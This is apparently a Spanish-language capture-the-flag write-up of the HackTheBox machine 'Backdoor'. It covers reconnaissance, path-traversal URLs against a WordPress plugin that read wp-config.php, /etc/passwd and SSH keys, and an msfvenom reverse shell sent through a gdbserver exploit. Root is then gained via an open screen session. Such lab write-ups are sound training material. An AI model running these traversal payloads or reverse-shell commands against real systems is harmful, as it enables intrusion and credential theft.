---
layout: post
title: Backdoor - WriteUp
author: WildZarek
permalink: /htb/backdoor
excerpt: "Máquina Linux de nivel fácil en la que estaremos explotando una vulnerabilidad en un plugin de WordPress, la cual nos va a permitir lograr un Local File Inclusion con Directory Path Traversal, luego abusaremos de otra vulnerabilidad en el servidor GDB para lograr acceso a la máquina y finalmente escalaremos privilegios aprovechando una sesión abierta de Screen del usuario root."
description: "Máquina Linux de nivel fácil en la que estaremos explotando una vulnerabilidad en un plugin de WordPress, la cual nos va a permitir lograr un Local File Inclusion con Directory Path Traversal, luego abusaremos de otra vulnerabilidad en el servidor GDB para lograr acceso a la máquina y finalmente escalaremos privilegios aprovechando una sesión abierta de Screen del usuario root."
date: 2022-04-23
header:
  teaser: /assets/images/hackthebox/backdoor.png
  teaser_home_page: true
  icon: /assets/images/hackthebox/htb_icon_original.png
categories: [HackTheBox, Pentesting, Privilege Escalation]
tags: [CVE, WordPress, PATH Traversal, GDB Server, RCE, Screen]
---

<p align="center"><img src="/assets/images/hackthebox/machines/backdoor.png"></p>

## Fecha de Resolución

<a href="https://www.hackthebox.com/achievement/machine/18979/416">
  <img src="/assets/images/hackthebox/machines/backdoor/pwned_date.png">
</a>

## Fase de Reconocimiento

Empezamos con el reconocimiento de puertos lanzando un **`TCP SYN Port Scan`**

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea el rango completo de puertos (hasta el 65535)    |
| -sS       | Realiza un escaneo de tipo SYN port scan                 |
| --min-rate | Enviar paquetes no más lentos que 5000 por segundo      |
| --open    | Mostrar sólo los puertos que esten abiertos              |
| -vvv      | Triple verbose para ver en consola los resultados        |
| -n        | No efectuar resolución DNS                               |
| -Pn       | No efectuar descubrimiento de hosts                      |
| -oG       | Guarda el output en un archivo con formato grepeable para usar la función [extractPorts](https://pastebin.com/tYpwpauW) de [S4vitar](https://s4vitar.github.io/)

```console
p3ntest1ng:~$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.125 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-28 00:00 CET
Initiating SYN Stealth Scan at 00:00
Scanning 10.10.11.125 [65535 ports]
Discovered open port 22/tcp on 10.10.11.125
Discovered open port 80/tcp on 10.10.11.125
Discovered open port 1337/tcp on 10.10.11.125
Completed SYN Stealth Scan at 00:00, 12.99s elapsed (65535 total ports)
Nmap scan report for 10.10.11.125
Host is up, received user-set (0.17s latency).
Scanned at 2022-01-28 00:00:13 CET for 13s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
1337/tcp open  waste   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
           Raw packets sent: 65574 (2.885MB) | Rcvd: 65574 (2.623MB)
```

Identificamos varios puertos abiertos:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)** - SSH o Secure Shell |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Servidor_web)** - Servidor web      |
| 1337   | Nullsoft WASTE encrypted P2P app ¿? |

Vamos a obtener más información con un escaneo específico sobre los puertos que hemos encontrado.

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escanea sobre los puertos especificados                |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Determina la versión del servicio                      |
| -oN       | Guarda el output en un archivo con formato normal      |

```console
p3ntest1ng:~$ nmap -sCV -p 22,80,1337 10.10.11.125 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-28 00:17 CET
Nmap scan report for 10.10.11.125
Host is up (0.074s latency).

PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
1337/tcp closed waste
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.36 seconds
```

Asignamos un virtualhost a la máquina en nuestro archivo **`/etc/hosts`** para mayor comodidad.

```console
p3ntest1ng:~$ echo '10.10.11.125 backdoor.htb' | sudo tee -a /etc/hosts
```

Veamos qué tecnologías se están utilizando en la web que hay alojada en el sistema con **`whatweb`**

```console
p3ntest1ng:~$ whatweb http://backdoor.htb/
http://backdoor.htb/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.125], JQuery[3.6.0], MetaGenerator[WordPress 5.8.1], PoweredBy[WordPress], Script, Title[Backdoor &#8211; Real-Life], UncommonHeaders[link], WordPress[5.8.1]
```

Analicemos el puerto **80** con un script de reconocimiento HTTP básico de nmap. Sabemos que se ha utilizado **`WordPress v5.8.1`** como gestor de contenido.

| Parámetro | Descripción |
| --------- | :---------- |
| --script  | Ejecución de scripts escritos en LUA. Usamos **http-enum** |
| -p        | Escanea sobre el puerto especificado                       |
| -oN       | Guarda el output en un archivo con formato normal          |

```console
p3ntest1ng:~$ nmap --script http-enum -p 80 10.10.11.125 -oN webScan

Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-28 00:21 CET
Nmap scan report for backdoor.htb (10.10.11.125)
Host is up (0.056s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 5.8.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.

Nmap done: 1 IP address (1 host up) scanned in 20.10 seconds
```

Encontramos algunos archivos interesantes: **`wp-login.php`** y **`/wp-admin/upgrade.php`**
Realicemos un poco de fuzzing para ver qué más podemos encontrar en el servidor web. Primero usamos un diccionario pequeño y si no encontramos nada usamos uno más grande.

| Parámetro | Descripción |
| --------- | :---------- |
| -c        | Muestra el output en formato colorizado |
| -w        | Utiliza el diccionario especificado     |
| --hc 404  | Oculta todos los códigos de estado 404  |

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://backdoor.htb/FUZZ 2>/dev/null

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://backdoor.htb/FUZZ
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000001:   200        329 L    4126 W     63901 Ch    "http://backdoor.htb/"                                                                                                      
000000013:   403        9 L      28 W       277 Ch      ".htpasswd"                                                                                                                 
000000012:   403        9 L      28 W       277 Ch      ".htaccess"                                                                                                                 
000000011:   403        9 L      28 W       277 Ch      ".hta"                                                                                                                      
000002021:   301        0 L      0 W        0 Ch        "index.php"                                                                                                                 
000003588:   403        9 L      28 W       277 Ch      "server-status"                                                                                                             
000004485:   301        9 L      28 W       315 Ch      "wp-admin"                                                                                                                  
000004501:   301        9 L      28 W       318 Ch      "wp-includes"                                                                                                               
000004495:   301        9 L      28 W       317 Ch      "wp-content"                                                                                                                
000004568:   405        0 L      6 W        42 Ch       "xmlrpc.php"                                                                                                                

Total time: 0
Processed Requests: 4614
Filtered Requests: 4604
Requests/sec.: 0
```

Podemos ver el panel de login, en el cual he probado si es vulnerable a **`SQL Injection`** sin éxito:
![wp-login](/assets/images/hackthebox/machines/backdoor/wplogin.png)

Alternativamente, podemos realizar un análisis más profundo con **`wpscan`**:

```console
p3ntest1ng:~$ wpscan --url http://backdoor.htb/ -e vp vt dbe ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://backdoor.htb/ [10.10.11.125]
[+] Started: Fri Jan 28 00:33:57 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://backdoor.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://backdoor.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://backdoor.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://backdoor.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://backdoor.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://backdoor.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://backdoor.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://backdoor.htb/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jan 28 00:34:10 2022
[+] Requests Done: 48
[+] Cached Requests: 5
[+] Data Sent: 10.55 KB
[+] Data Received: 18.161 MB
[+] Memory used: 215.465 MB
[+] Elapsed time: 00:00:12
```

A pesar de toda la información, no he logrado acceso al panel de administración de WordPress.

## Fase de Explotación

Podemos tratar de ver los plugins instalados en la web:

![plugins](/assets/images/hackthebox/machines/backdoor/plugins.png)

Vemos que tienen instalado el plugin **`ebook-download`**, busquemos alguna vulnerabilidad y su correspondiente exploit.

```console
p3ntest1ng:~$ searchsploit Wordpress eBook Download
-------------------------------------------------------------- -----------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- -----------------------
WordPress Plugin eBook Download 1.1 - Directory Traversal     | php/webapps/39575.txt
-------------------------------------------------------------- -----------------------
Shellcodes: No Results
```

Podemos ver la explicación y el POC (Proof of Concept) aquí: https://www.exploit-db.com/exploits/39575
El plugin es vulnerable a **`Directory Path Traversal`** por lo cual podemos descargarnos archivos locales de forma remota.

Lo primero que podemos hacer es descargarnos una copia del archivo **`wp-config.php`** ya que suele contener el usuario y la contraseña.

```
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

En este caso encontramos el usuario **`worpressuser`** y la contraseña **`MQYBJSaD#DxG6qbm`**.
Podemos descargar el archivo **`/etc/passwd`** para listar los usuarios existentes en el sistema.

```
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd
```

```console
p3ntest1ng:~$ cat passwd | grep -v "false\|nologin" | tr ":" " " | column -t
/etc/passwd/etc/passwd/etc/passwdroot  x  0     0      root  /root       /bin/bash
sync                                   x  4     65534  sync  /bin        /bin/sync
user                                   x  1000  1000   user  /home/user  /bin/bash
```

Conociendo el usuario, podemos intentar descargarnos el archivo **`id_rsa`** para conectarnos por SSH.

```
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../home/user/.ssh/id_rsa
```

Sin embargo esto no funciona, tal vez no tenemos permisos, probemos otra cosa. 
Si recordamos los puertos encontrados, vimos que el **1337** está cerrado. Este puerto es utilizado por [GDB Server](https://www.man7.org/linux/man-pages/man1/gdbserver.1.html).
Buscando un poco en Google, he encontrado este exploit para la versión **`9.2`**: [https://www.exploit-db.com/exploits/50539](https://www.exploit-db.com/exploits/50539)

Vamos a descargarlo en nuestra máquina y comprobemos si es vulnerable. Vamos a utilizar **`msfvenom`** para generar el payload.

```console
p3ntest1ng:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.114 LPORT=9999 PrependFork=true -o rev.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Saved as: rev.bin
```

Ahora nos ponemos en escucha por el puerto **`9999`** con **`netcat`**. Y ejecutamos el exploit:

```console
p3ntest1ng:~$ python3 gdbserver92_exploit.py 10.10.11.125:1337 rev.bin
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
```

```console
p3ntest1ng:~$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.16.114] from (UNKNOWN) [10.10.11.125] 35514
python3 -c "import pty; pty.spawn('/bin/bash')"
```

Vamos a realizar un tratamiento a la tty para poder movernos con mayor comodidad.

```console
user@Backdoor:/home/user$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
/usr/bin/bash: /usr/bin/bash: cannot execute binary file
Script done, file is /dev/null
user@Backdoor:/home/user$ ^Z
zsh: suspended  nc -nlvp 9999
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 9999
                               reset xterm
user@Backdoor:/home/user$ export TERM=xterm
user@Backdoor:/home/user$ export SHELL=bash
user@Backdoor:/home/user$ ls
user.txt
user@Backdoor:/home/user$ cat user.txt 
3c8331a33082e9498264297139288028
```

## Escalada de Privilegios

Lo primero es ver si tenemos algún permiso a nivel de sudo:

```console
user@Backdoor:/home/user$ sudo -l
[sudo] password for user: 
```

Nos pide contraseña pero no la conocemos, por lo tanto no podemos listar los permisos.

Con el comando **`ps aux`** podemos listar todos los procesos en ejecución. De entre todos, uno me llama la atención:

```console
root         913  0.0  0.1   6952  2436 ?        Ss   01:55   0:00 SCREEN -dmS root
```

Como vemos, se está ejecutando una sesión **`screen`** referenciada con el nombre **`root`**. Vamos a entrar en la sesión:

```console
p3ntest1ng:~$ /usr/bin/screen -x root/root
```

```console
root@Backdoor:~# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
root@Backdoor:~# ls
root.txt
root@Backdoor:~# cat root.txt 
7dc16ed16413b46043c7adf087fe1b69
root@Backdoor:~# 
```

### ¡Gracias por leer hasta el final!

#### Nos vemos en un próximo. ¡Feliz hacking! ☠